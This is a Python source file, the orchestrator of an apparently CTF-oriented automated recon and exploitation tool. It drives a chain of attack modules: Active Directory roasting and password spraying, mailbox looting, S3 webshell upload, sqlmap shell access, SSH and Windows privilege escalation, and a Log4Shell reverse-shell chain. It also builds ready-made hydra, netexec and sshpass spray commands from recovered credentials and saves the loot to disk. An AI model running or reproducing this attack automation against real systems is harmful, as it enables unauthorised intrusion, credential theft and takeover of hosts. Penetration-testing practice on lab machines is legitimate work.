"""The orchestrator.

Runs recon in adaptive phases and dispatches service-specific deep modules
based on what the port scan actually finds. A second dispatch pass runs if
earlier modules discover new hostnames (e.g. a TLS SAN), so virtual-host-only
content gets a look too.
"""

from __future__ import annotations

from typing import List

from . import utils, hostsfile, tooling
from .report import HostReport, Finding
from ..data import knowledge
from ..modules import discovery, ports, fingerprint, nmapscan, exploitintel
from ..modules.services import (
    http, tls, dns, smb, auth_svcs, datastores, ldap, vhost,
    snmp, mail, netshares, sqldb, remote, webcrawl, params, s3exploit,
    webexploit, sshprivesc, winattack, web_debug, log4shell, adattack,
    mailloot)


def _is_ip(name: str) -> bool:
    parts = name.split(".")
    return len(parts) == 4 and all(p.isdigit() for p in parts)


class Engine:
    def __init__(self, target: str, opts) -> None:
        self.opts = opts
        self.host = HostReport(target=target)
        self._dispatched: set = set()
        self._web_enriched: set = set()   # (port, vhost) already web-enriched
        self._hosts_done: set = set()     # vhost names already /etc/hosts-handled

    # -- phases -------------------------------------------------------------
    def run(self) -> HostReport:
        host = self.host
        ip = discovery.resolve(host)
        if not ip:
            host.note("Target unresolvable", severity="high", category="host")
            host.finished = utils.now_iso()
            return host

        discovery.liveness(host, ip)

        # Port discovery: prefer the nmap/rustscan pipeline (fast + NSE intel);
        # fall back to the pure-python scanner when nmap is unavailable or the
        # user forced --no-nmap.
        open_ports = None
        used_nmap = False
        if not getattr(self.opts, "no_nmap", False):
            open_ports = nmapscan.orchestrate(host, ip, self.opts)
            used_nmap = open_ports is not None
        if open_ports is None:
            open_ports = ports.connect_scan(
                host, ip, self._port_selection(),
                timeout=self.opts.timeout, workers=self.opts.workers)

        if not open_ports:
            utils.log("warn", "no open ports — nothing to enrich")
            host.finished = utils.now_iso()
            return host

        # Confirm what each port actually speaks before dispatching modules.
        # nmap -sV is authoritative, so only fingerprint when it didn't run.
        if not used_nmap:
            fingerprint.refine(host, timeout=max(self.opts.timeout, 4.0))

        # First deep pass over discovered services.
        self._dispatch(open_ports)

        # /etc/hosts FIRST: a hostname learned from nmap, a redirect, a TLS
        # cert, or the page itself is a near-mandatory CTF step and can change
        # what the server serves. Map it now so the vhost brute and every
        # by-name probe below resolve it.
        self._hosts_step()

        # Virtual-host brute forcing — the usual foothold on hard web boxes.
        if not self.opts.no_vhost:
            self._vhost_brute()

        # Map anything the brute just discovered, too.
        self._hosts_step()

        # Enrich EVERY known virtual host on the web ports (bounded, deduped).
        # A box like Orion serves nothing on the bare IP and everything behind
        # a vhost it reveals via a redirect / nmap http-title — this is where
        # that content actually gets scanned.
        self._enrich_vhosts()

        self._ad_methodology()
        self._os_inference()

        # AD attack chain: anonymous enum -> AS-REP roast -> crack -> spray ->
        # WinRM flag / Kerberoast / BloodHound. Runs before credential reuse and
        # the Windows-attack pass so every credential it recovers flows into
        # them (spray -> MSSQL/psexec/wmiexec -> SYSTEM).
        adattack.run(host, self.opts)

        self._credential_reuse()

        # Mailbox reading: replay recovered creds across learned usernames over
        # IMAP/POP3 — the mailbox is the usual next hop after an onboarding-doc
        # or web credential (HTB Enigma: NFS onboarding creds -> IMAP -> flag).
        mailloot.run(host, self.opts)

        # S3-compatible storage chain: list anonymously always; upload a
        # webshell + confirm RCE only with --exploit. Runs after vhosts are
        # mapped so the AWS CLI resolves s3.<domain>.
        if host.s3_endpoints:
            s3exploit.run(host, self.opts)

        # Authenticated web exploitation: log in with any recovered credential,
        # crawl the authed area, and drive sqlmap --os-cmd to a shell + flags.
        webexploit.run(host, self.opts)

        # SSH + sudo/GTFOBins privesc with any recovered credential -> root flag.
        # Runs last so it can use creds looted by the web-exploit phase.
        sshprivesc.run(host, self.opts)

        # Windows: recovered creds -> MSSQL xp_cmdshell RCE + impacket/netexec
        # spray + privesc playbook.
        winattack.run(host, self.opts)

        # Log4Shell (CVE-2021-44228) — UniFi Network + friends. Detect + confirm
        # the version always; with --exploit, drive the full JNDI -> reverse
        # shell -> Mongo reset -> SSH -> root-flag chain.
        log4shell.run(host, self.opts)

        # Adaptive convergence: facts learned during loot / mail (a webmail host
        # named in an onboarding PDF, a new credential in a mailbox) feed back
        # into enumeration + credentialed exploitation until nothing new appears.
        self._converge()

        # Turn identified versions into concrete Exploit-DB leads.
        if not getattr(self.opts, "no_searchsploit", False):
            exploitintel.run(host)

        self._write_loot()
        host.finished = utils.now_iso()
        return host

    def _write_loot(self) -> None:
        """Persist harvested flags / creds / usernames to loot files so the
        operator (and the generated impacket/hydra commands that reference
        loot/users.txt) have them on disk."""
        import os
        import re as _re
        host = self.host
        flags, users, creds = [], [], list(dict.fromkeys(host.creds))
        for f in host.findings:
            if f.category == "flag" and f.detail:
                flags.append(f.detail.strip())
            if f.category == "cred" and f.evidence and ":" in f.evidence:
                m = _re.search(r"([A-Za-z0-9._\\-]+):[^\s]+$", f.evidence.strip())
                if m:
                    users.append(m.group(1).split("\\")[-1])
            if "Email/username leak" in f.title:
                m = _re.search(r"([A-Za-z0-9._-]+)@", f.title)
                if m:
                    users.append(m.group(1))
        flags = list(dict.fromkeys(flags))
        users = list(dict.fromkeys(users))
        if not (flags or users or creds):
            return
        try:
            d = os.path.join(os.getcwd(), "scryer_loot", host.resolved_ip or "target")
            os.makedirs(d, exist_ok=True)
            for name, items in (("flags.txt", flags), ("users.txt", users),
                                ("creds.txt", creds)):
                if items:
                    with open(os.path.join(d, name), "w") as fh:
                        fh.write("\n".join(items) + "\n")
            if flags or creds:
                utils.log("good", f"loot saved: {d} "
                                  f"({len(flags)} flags, {len(users)} users, "
                                  f"{len(creds)} creds)")
        except OSError:
            pass

    def _converge(self) -> None:
        """Re-map + web-enrich any hosts discovered mid-run (doc/mail), then
        re-run credentialed exploitation on the new surface. Bounded so a run
        can't spin — stops as soon as a pass adds no new hosts or creds."""
        host = self.host
        for _ in range(2):
            h0, c0 = len(host.hostnames), len(host.creds)
            self._hosts_step()
            self._enrich_vhosts()           # only enriches not-yet-seen vhosts
            if host.creds:
                webexploit.run(host, self.opts)
                mailloot.run(host, self.opts)   # guarded against identical re-run
            if len(host.hostnames) == h0 and len(host.creds) == c0:
                break

    def _vhost_brute(self) -> None:
        host = self.host
        web = [e for e in host.open_ports
               if self._is_web(e["port"], (e.get("service") or "").lower())]
        for entry in web:
            secure = bool(entry.get("secure")) or entry["port"] in knowledge.HTTPS_PORTS
            vhost.brute(host, entry["port"], secure,
                        domain=getattr(self.opts, "vhost_domain", None))

    def _hosts_step(self) -> None:
        # Only act on names we haven't handled yet, so calling this more than
        # once (early, then after the vhost brute) never double-prints.
        names = [n for n in hostsfile.vhost_names(self.host)
                 if n not in self._hosts_done]
        if not names:
            return
        self._hosts_done.update(names)
        ip = self.host.resolved_ip
        cmd = hostsfile.command(ip, names)
        if getattr(self.opts, "add_hosts", False):
            if hostsfile.add(ip, names):
                utils.log("good", f"added to /etc/hosts: {ip} {' '.join(names)}")
            else:
                utils.log("warn", f"could not edit /etc/hosts — run: {cmd}")
        else:
            utils.log("warn", f"add these vhosts to /etc/hosts (or use "
                              f"--add-hosts): {utils.c(ip + ' ' + ' '.join(names), utils.C.CYAN)}")
        self.host.add(Finding(
            title="Virtual hosts need /etc/hosts entries",
            detail=hostsfile.command(ip, hostsfile.vhost_names(self.host)),
            severity="info", category="host",
            evidence=cmd))

    def _ad_methodology(self) -> None:
        """If the port mix looks like an AD domain controller, drop the
        standard next-step methodology so the user has a plan even before
        credentials."""
        ports_open = {e["port"] for e in self.host.open_ports}
        if not ({88} & ports_open and ({389, 636, 3268} & ports_open)):
            return
        self.host.add(Finding(
            title="Active Directory domain controller detected",
            detail="Kerberos + LDAP + SMB present. Next steps: enumerate users "
                   "(anonymous LDAP / RID cycling / rpcclient), AS-REP roast "
                   "(GetNPUsers.py), then password-spray; with any creds run "
                   "BloodHound and Kerberoast (GetUserSPNs.py). Add the DC FQDN "
                   "to /etc/hosts for LDAP/Kerberos to work.",
            severity="info", category="host", confidence="potential"))
        utils.log("info", "Active Directory DC fingerprint — see methodology finding")

    def _credential_reuse(self) -> None:
        """Password reuse is the #1 CTF pivot: any plaintext scryer recovered
        (cracked archive, config, hard-coded creds) should be sprayed across
        every login service on the box. Emit ready commands."""
        host = self.host
        creds = host.creds
        if not creds:
            return
        ports_open = {e["port"] for e in host.open_ports}
        ip = host.resolved_ip
        users = (tooling.find_wordlist("users")
                 or tooling.bundled_wordlist("users") or "users.txt")
        lines = []
        for c in creds[:5]:
            if 22 in ports_open:
                lines.append(f"hydra -L {users} -p '{c}' ssh://{ip} -t 4 -f")
            if {139, 445} & ports_open:
                lines.append(f"netexec smb {ip} -u {users} -p '{c}' --continue-on-success")
            if 21 in ports_open:
                lines.append(f"hydra -L {users} -p '{c}' ftp://{ip} -t 8 -f")
            if 3306 in ports_open:
                lines.append(f"mysql -h {ip} -u root -p'{c}'")
            if 5432 in ports_open:
                lines.append(f"PGPASSWORD='{c}' psql -h {ip} -U postgres")
        # Also worth trying each cred as its own username (user==pass reuse).
        if 22 in ports_open:
            for c in creds[:5]:
                lines.append(f"sshpass -p '{c}' ssh {c}@{ip}   # user==pass")
        if not lines:
            lines.append("No standard login service open — reuse these on any "
                         "web login / service you find.")
        utils.log("hot", f"{len(creds)} credential(s) recovered — spray them "
                         f"(password reuse is the usual pivot)")
        host.add(Finding(
            title=f"Password reuse: spray {len(creds)} recovered credential(s)",
            detail="Recovered: " + ", ".join(creds[:10]) + "\n\n"
                   + "\n".join(dict.fromkeys(lines)),
            severity="high", category="cred", confidence="potential",
            evidence="\n".join(creds)))

    # -- helpers ------------------------------------------------------------
    def _port_selection(self) -> List[int]:
        if self.opts.ports == "top":
            return knowledge.TOP_PORTS
        if self.opts.ports == "full":
            return list(range(1, 65536))
        # explicit comma list
        out = []
        for chunk in self.opts.ports.split(","):
            chunk = chunk.strip()
            if "-" in chunk:
                a, b = chunk.split("-", 1)
                out.extend(range(int(a), int(b) + 1))
            elif chunk.isdigit():
                out.append(int(chunk))
        return out or knowledge.TOP_PORTS

    def _dispatch(self, open_ports: List[int]) -> None:
        host = self.host
        for entry in list(host.open_ports):
            port = entry["port"]
            svc = (entry.get("service") or "").lower()
            key = ("web" if self._is_web(port, svc) else svc, port)
            if key in self._dispatched:
                continue

            handled = self._dispatch_one(host, port, svc)
            if handled:
                self._dispatched.add(key)

    def _web_enrich(self, port: int, secure: bool, vhost=None) -> None:
        """Full web treatment for one (port, vhost): TLS, HTTP enrich, whatweb,
        crawl, optional dir-brute + paramvoid. Deduped via _web_enriched so a
        vhost learned by several routes is only scanned once."""
        host = self.host
        key = (port, vhost)
        if key in self._web_enriched:
            return
        self._web_enriched.add(key)

        if secure and vhost is None:
            tls.enrich(host, port)
        http.enrich(host, port, secure=secure, vhost=vhost)
        web_debug.probe(host, port, secure, vhost=vhost, opts=self.opts)
        webcrawl.whatweb(host, port, secure, vhost=vhost)
        endpoints = webcrawl.crawl(host, port, secure, vhost=vhost) or []
        if getattr(self.opts, "web_brute", False):
            webcrawl.dir_brute(host, port, secure, vhost=vhost)
        if getattr(self.opts, "web_brute", False) or getattr(self.opts, "params", False):
            scheme = "https" if secure else "http"
            # Target the vhost by name so external tools (needing /etc/hosts)
            # hit the right virtual host; the bare IP otherwise.
            base_url = f"{scheme}://{vhost or host.resolved_ip}:{port}"
            params.discover(host, port, secure, base_url, endpoints)

    def _enrich_vhosts(self) -> None:
        """Enrich every known virtual host on every web port. Runs in bounded
        passes so a vhost that itself reveals more vhosts still gets covered."""
        host = self.host
        for _ in range(3):
            names = [h for h in host.hostnames
                     if "." in h and h != host.resolved_ip and not _is_ip(h)]
            # Safety net: never enrich a flood of vhosts (a catch-all that
            # slipped past vhost filtering). vhost.brute already suppresses
            # these, but keep the enrichment phase bounded regardless.
            if len(names) > 25:
                utils.log("warn", f"{len(names)} vhosts queued — capping "
                                  "enrichment to first 25 (likely a catch-all)")
                names = names[:25]
            web = [e for e in host.open_ports
                   if self._is_web(e["port"], (e.get("service") or "").lower())]
            pending = [(e, n) for e in web for n in names
                       if (e["port"], n) not in self._web_enriched]
            if not pending:
                break
            names_here = sorted({n for _e, n in pending})
            utils.log("info", f"virtual-host enrichment: {', '.join(names_here)}")
            for entry, name in pending:
                secure = bool(entry.get("secure")) or entry["port"] in knowledge.HTTPS_PORTS
                self._web_enrich(entry["port"], secure, vhost=name)

    def _dispatch_one(self, host, port: int, svc: str) -> bool:
        try:
            entry = self._entry(port)
            secure = bool(entry.get("secure")) if entry else False
            if self._is_web(port, svc):
                secure = secure or port in knowledge.HTTPS_PORTS or "https" in svc
                self._web_enrich(port, secure, vhost=None)
                return True

            if secure or port in (443, 8443) or "ssl" in svc:
                tls.enrich(host, port)
                return True
            if svc == "dns" or port == 53:
                dns.enrich(host, port)
                return True
            if port in (139, 445) or "smb" in svc or "netbios" in svc:
                smb.enrich(host, port)
                return True
            if port in (389, 636, 3268, 3269) or "ldap" in svc:
                ldap.enrich(host, port)
                return True
            if port == 21 or svc == "ftp":
                auth_svcs.ftp(host, port)
                return True
            if port in (22, 2222) or svc == "ssh":
                auth_svcs.ssh(host, port)
                return True
            if port == 6379 or svc == "redis":
                datastores.redis(host, port)
                return True
            if port == 11211 or svc == "memcached":
                datastores.memcached(host, port)
                return True
            if port in (9200, 9300) or svc == "elasticsearch":
                datastores.elasticsearch(host, port)
                return True
            if port in (27017, 27018) or svc == "mongodb":
                datastores.mongodb(host, port)
                return True
            if port in (25, 465, 587) or svc in ("smtp", "smtps", "submission"):
                mail.enrich(host, port)
                return True
            if port == 161 or "snmp" in svc:
                snmp.enrich(host, port)
                return True
            if port == 2049 or svc == "nfs":
                netshares.nfs(host, port)
                return True
            if port == 873 or svc == "rsync":
                netshares.rsync(host, port)
                return True
            if port == 3306 or svc == "mysql":
                sqldb.mysql(host, port)
                return True
            if port == 5432 or svc in ("postgresql", "postgres"):
                sqldb.postgresql(host, port)
                return True
            if port == 1433 or "ms-sql" in svc or svc == "mssql":
                sqldb.mssql(host, port)
                return True
            if port == 3389 or svc in ("rdp", "ms-wbt-server"):
                remote.rdp(host, port)
                return True
            if port in (5900, 5901, 5902) or svc == "vnc":
                remote.vnc(host, port)
                return True
            if port in (5985, 5986) or "winrm" in svc or "wsman" in svc:
                remote.winrm(host, port)
                return True
        except Exception as exc:  # keep one bad module from killing the scan
            utils.log("bad", f"module error on port {port}: {exc}")
        return False

    def _entry(self, port: int):
        for e in self.host.open_ports:
            if e["port"] == port:
                return e
        return None

    @staticmethod
    def _is_web(port: int, svc: str) -> bool:
        # Prefer the observed protocol; fall back to the port map only when a
        # port was never fingerprinted (e.g. nmap-only entries).
        if svc in ("http", "https"):
            return True
        if svc and "http" not in svc:
            return False
        return port in knowledge.HTTP_PORTS or port in knowledge.HTTPS_PORTS

    def _os_inference(self) -> None:
        """Cheap OS guess from service mix when nmap didn't provide one."""
        host = self.host
        if host.os_guess:
            return
        svcs = " ".join((p.get("service") or "") + " " + (p.get("banner") or "")
                        for p in host.open_ports).lower()
        windows_signals = ("microsoft", "netbios", "msrpc", "rdp", "winrm",
                           "iis", "ms-wbt")
        linux_signals = ("openssh", "ubuntu", "debian", "apache", "vsftpd",
                         "unix", "linux")
        win = sum(s in svcs for s in windows_signals)
        lin = sum(s in svcs for s in linux_signals)
        if win > lin and win:
            host.os_guess = "Windows (inferred from service mix)"
        elif lin > win and lin:
            host.os_guess = "Linux/Unix (inferred from service mix)"
        if host.os_guess:
            host.add(Finding(title=f"OS guess: {host.os_guess}",
                             severity="info", category="host"))
